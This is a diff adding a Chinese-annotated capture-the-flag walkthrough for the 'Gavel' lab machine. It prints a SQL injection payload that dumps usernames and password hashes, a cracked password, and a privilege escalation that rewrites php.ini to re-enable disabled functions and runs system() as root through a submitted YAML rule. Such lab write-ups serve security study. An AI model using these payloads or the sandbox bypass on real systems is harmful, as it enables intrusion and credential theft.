@@ -320,3 +320,189 @@ maki_adm@barrier:~$
 </details>
 
 ----------------------------------------------------------------------------------
+#### '~$ RULE_PATH=/home/auctioneer/php.ini gavel-util submit item.yaml' From Gavel
+<details>
+<summary>gitdumper</summary>
+
+```
+--------------------------------------------------------------
+[★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ
+.git                    [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1791ms]
+//使用 gitdumper 来获取该应用程序的源代码
+[★]$ wget https://raw.githubusercontent.com/arthaud/git-dumper/refs/heads/master/git_dumper.py
+[★]$ chmod +x git_dumper.py
+[★]$ python3 git_dumper.py http://gavel.htb/.git/ git
+--------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>SQL PDO && burpsuite</summary>
+
+```
+--------------------------------------------------------------
+[★]$ cat inventory.php
+else {
+        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
+        $stmt->execute([$userId]);
+    }
+--------------------------------------------------------------
+Burpsuite 进行排序时拦截对 inventory.php 的请求
+首先先切换到‘quantity'，Setting本地流量，切换'name'拦截 -> 直接在Pretty输入 -> Setting恢复网络 -> Forward
+--------------------------------------------------------------
+//数据库中的表
+user_id=item_name`%20FROM%20(SELECT%20table_name%20AS%20`%27item_name`%20from%20information_schema.tables)y;--&sort=\?--%00
+//数据组表的数量
+user_id=item_name`%20FROM%20(SELECT%20COUNT(*)%20AS%20`%27item_name`%20from%20information_schema.tables%20where%20table_schema=database())y;--&sort=\?--%00
+//从“users”表中提取用户名和密码字
+user_id=item_name`%20FROM%20(SELECT%20CONCAT_WS(0x3a,%20id,%20username,%20password)%20AS%20`%27item_name`%20from%20users)y;--&sort=\?--%00
+--------------------------------------------------------------
+[★]$ cat hash
+$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
+[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[★]$ gunzip rockyou.txt.gz
+[★]$ hashcat -m 3200 hash rockyou.txt
+$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS:midnight1
+--------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>gavel-util二进制文件</summary>
+
+```
+--------------------------------------------------------------
+//查看一下这个组所拥有的文件
+auctioneer@gavel:/var/www/html/gavel/includes$ id
+uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
+auctioneer@gavel:/var/www/html/gavel/includes$ find / -group gavel-seller 2>/dev/null
+/run/gaveld.sock
+/usr/local/bin/gavel-util
+--------------------------------------------------------------
+auctioneer@gavel:/$ cd ~
+auctioneer@gavel:~$ file /usr/local/bin/gavel-util
+/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped
+--------------------------------------------------------------
+auctioneer@gavel:~$ /usr/local/bin/gavel-util
+Usage: /usr/local/bin/gavel-util <cmd> [options]
+Commands:
+  submit <file>           Submit new items (YAML format)
+  stats                   Show Auction stats
+  invoice                 Request invoice
+--------------------------------------------------------------
+auctioneer@gavel:~$ ps aux | grep gavel
+root        1000  0.0  0.0  19128  3848 ?        Ss   07:56   0:00 /opt/gavel/gaveld
+root        1011  0.4  0.4  26784 18488 ?        Ss   07:56   1:08 python3 /root/scripts/timeout_gavel.py
+auction+   45987  0.0  0.0   6968  2556 pts/1    S+   12:08   0:00 grep gavel
+--------------------------------------------------------------
+auctioneer@gavel:/opt/gavel$ ls -la
+total 56
+drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
+-rwxr-xr-- 1 root root 35992 Oct  3  2025 gaveld
+-rw-r--r-- 1 root root   364 Sep 20  2025 sample.yaml
+drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
+--------------------------------------------------------------
+auctioneer@gavel:/opt/gavel$ ls
+gaveld	sample.yaml  submission
+auctioneer@gavel:/opt/gavel$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+--------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>Ghidra --> -rwxr-xr-- 1 root root 35992 Oct  3  2025 gaveld</summary>
+
+```
+--------------------------------------------------------------
+[★]$ wget http://10.129.242.203:8011/gaveld
+--------------------------------------------------------------
+在 Ghidra 中打开它，来查看解码后的源代码。
+[★]$ ghidra        //它是一个项目制工具（Project-based）
+
+创建 Project
+打开后：
+点击：
+File → New Project
+选择：        Non-Shared Project
+取名字，比如： gavel
+
+导入二进制文件
+点击：File → Import File
+然后选：/opt/gavel/gaveld
+
+双击 gaveld
+进入分析界面（CodeBrowser）
+一定要点：✔ Analyze（自动分析，非常关键）
+//查看程序树，有一个名为“php_safe_run”的函数，看起来挺有意思的。
+//Program Tree -> Symbol Tree -> Functions -> php_safe_run
+--------------------------------------------------------------
+ json_object_object_get_ex(param_1,&DAT_00105004,&local_3100);
+  if (((local_3100 == 0) || (iVar1 = json_object_is_type(local_3100,4), iVar1 == 0)) ||
+     (iVar1 = json_object_object_get_ex(local_3100,"RULE_PATH",local_30f8), iVar1 == 0)) {
+    strncpy(local_3048,"/opt/gavel/.config/php/php.ini",0x1000);
+    local_2049 = 0;
+  }
+
+如果 (没有 RULE_PATH)
+    用默认路径 /opt/gavel/.config/php/php.ini
+否则
+    用你提供的 RULE_PATH
+
+//默认路径被设置为：/opt/gavel/.config/php/php.ini
+//用户可以控制 RULE_PATH
+--------------------------------------------------------------
+auctioneer@gavel:/$ cat /opt/gavel/.config/php/php.ini
+engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off
+
+// system() 函数及其他危险函数被禁用
+--------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>加载自己的 php.ini 文件</summary>
+
+```
+--------------------------------------------------------------
+auctioneer@gavel:/$ cd ~
+auctioneer@gavel:~$ cp /opt/gavel/.config/php/php.ini .
+auctioneer@gavel:~$ sed -i 's/disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client/disable_functions=/g' php.ini
+--------------------------------------------------------------
+//创建一个新的 YAML 文件来提交恶意规则。
+auctioneer@gavel:~$ cat << 'EOF' > item.yaml
+> name: Exploit
+> description: Exploiting
+> image: test.png
+> price: 1
+> rule_msg: Exploiting
+> rule: |
+>   system('cat /root/root.txt > /home/auctioneer/root.txt');
+>   return true;
+> EOF
+--------------------------------------------------------------
+用了 system() 函数将根标志复制到 /home/auctioneer/ 目录下
+//使用“gavel-util”二进制文件提交该规则
+auctioneer@gavel:~$ RULE_PATH=/home/auctioneer/php.ini gavel-util submit item.yaml
+Item submitted for review in next auction
+
+auctioneer@gavel:~$ ls
+item.yaml  php.ini  root.txt  user.txt
+auctioneer@gavel:~$ cat /home/auctioneer/root.txt
+--------------------------------------------------------------
+```
+</details>
